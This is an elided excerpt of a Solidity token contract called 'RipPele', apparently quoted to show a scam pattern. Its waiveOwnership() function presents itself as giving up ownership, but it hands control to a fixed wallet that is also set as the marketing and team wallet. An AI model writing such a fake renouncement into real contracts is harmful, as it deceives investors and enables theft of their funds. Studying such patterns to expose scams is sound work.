...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xf503Bf704bA98aE62412682Fbd850D345b1Eb115));
        _owner = address(0xf503Bf704bA98aE62412682Fbd850D345b1Eb115);
    }
...
contract RipPele is Context, IERC20, Ownable {
    ...
    string private _symbol = "RIP PELE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xf503Bf704bA98aE62412682Fbd850D345b1Eb115);
    address payable public teamWalletAddress = payable(0xf503Bf704bA98aE62412682Fbd850D345b1Eb115);
